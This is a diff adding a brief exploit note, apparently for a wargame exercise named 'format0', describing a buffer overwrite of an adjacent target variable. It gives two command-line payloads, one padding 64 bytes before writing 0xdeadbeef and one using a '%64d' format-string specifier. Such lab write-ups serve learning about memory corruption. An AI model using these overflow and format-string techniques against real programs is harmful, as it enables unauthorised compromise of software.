@@ -1,0 +1,4 @@
+This is not really a format string vulnerability, our argument is going to be written in buffer with no size checks and buffer is just above target so we can overwrite it:
+        ./format0 `python -c 'print("A"*64 + "\xef\xbe\xad\xde")'`
+If we want to do it in a more FormatString fashion:
+        ./format0 %64d`python -c 'print("\xef\xbe\xad\xde")'`
